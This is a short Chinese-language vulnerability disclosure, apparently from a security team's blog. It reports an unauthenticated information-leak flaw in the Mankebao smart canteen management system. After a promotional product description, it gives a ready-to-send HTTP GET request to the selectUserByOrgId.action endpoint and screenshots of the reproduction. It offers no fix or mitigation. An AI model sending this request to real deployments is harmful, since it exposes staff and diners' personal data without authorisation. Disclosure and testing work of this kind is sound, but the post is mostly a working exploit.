#  满客宝智慧食堂管理系统selectUserByOrgId接口存在敏感信息泄露漏洞   
原创 R0seK1ller  蟹堡安全团队   2024-08-06 23:59  
  
## 1. 漏洞描述  
  
	  
    “满客宝智慧食堂”是一款全面、先进的食堂管理软件，能够为各类企事业单位、政府机关、高校、医院及大型团餐服务集团提供全新的“移动互联”信息化整体解决方案，帮助企业摒弃传统餐饮管理弊端，挖掘“移动互联”管理精髓，直达运营管理核心，由内而外打造理念超前、技术先进的互联网食堂。满客宝智慧食堂迎合移动互联时代潮流，创新打造便捷的食堂订餐模式，可实现精准备餐/采购杜绝浪费/腐败、加强员工和食堂的互动、提升员工就餐体验和食堂服务水平。满客宝智慧食堂管理系统selectUserByOrgId接口存在敏感信息泄露漏洞。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWkicQxOPON5a5MyqeLDa2OKUCKfUGoUiaK9ma9r8UzKtQgfCmoG2OvYrfmc9icaISOqweibic7ib92xQEw/640?wx_fmt=png&from=appmsg "")  
## 2. 漏洞复现  
```
GET /yuding/selectUserByOrgId.action?record= HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36
Connection: close

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zWkicQxOPON5a5MyqeLDa2OKNzbQIiaCibVFYRDkGIsClW5fJy6LEcFRuNjl3pcE6Mx95hFXvtZia7YOw/640?wx_fmt=png&from=appmsg "")  
```
```  
  
  
  
